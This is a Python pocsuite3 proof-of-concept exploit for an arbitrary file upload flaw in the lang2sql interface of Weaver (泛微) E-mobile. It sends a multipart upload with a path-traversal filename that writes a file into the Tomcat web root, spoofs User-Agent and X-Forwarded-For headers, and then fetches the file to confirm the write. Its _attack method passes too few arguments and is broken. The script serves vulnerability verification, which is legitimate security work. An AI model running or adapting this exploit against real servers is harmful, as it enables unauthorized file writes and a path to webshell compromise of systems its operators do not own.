#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import string
import random

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-13'
    createDate = '2023-11-13'
    updateDate = '2023-11-13'
    references = []
    name = '泛微_E-mobile_lang2sql接口任意文件上传'
    appPowerLink = ''
    appName = '泛微_E-mobile'
    appVersion = '泛微_E-mobile'
    vulType = 'Other'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def check(self, flag, filename):
        res = self._exploit(flag, filename)
        if res.status_code == 200 and "未知异常，请联系管理员" in res.text:
            headers = {
                'User-agent': tools.get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Upgrade-Insecure-Requests': '1',
                'X-Forwarded-For': tools.get_random_ip()
            }
            res = requests.get(url=f"{self.url}/{filename}.txt",
                            headers=headers, verify=False)
            logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
            return res

    def _exploit(self, flag, filename):
        headers = {
            'User-Agent': tools.get_random_ua(),
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Expect': '100-continue',
            'Connection': 'close',
            'X-Forwarded-For': tools.get_random_ua()
        }
        files = {
            'file': (f'../../../../appsvr/tomcat/webapps/ROOT/{filename}.txt', f'{flag}')
        }
        res = requests.post(
            url=f"{self.url}/emp/lang2sql?client_type=1&lang_tag=1",
            headers=headers,
            files=files,
            verify=False
        )

        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return res

    def _verify(self):
        try:
            result = {}
            filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
            flag = random_str(20)
            res = self.check(flag, filename)
            if flag in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['存在 泛微_E-mobile_lang2sql接口任意文件上传漏洞'] = self.url
            return self.parse_output(result)
        except Exception as e:
            pass

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
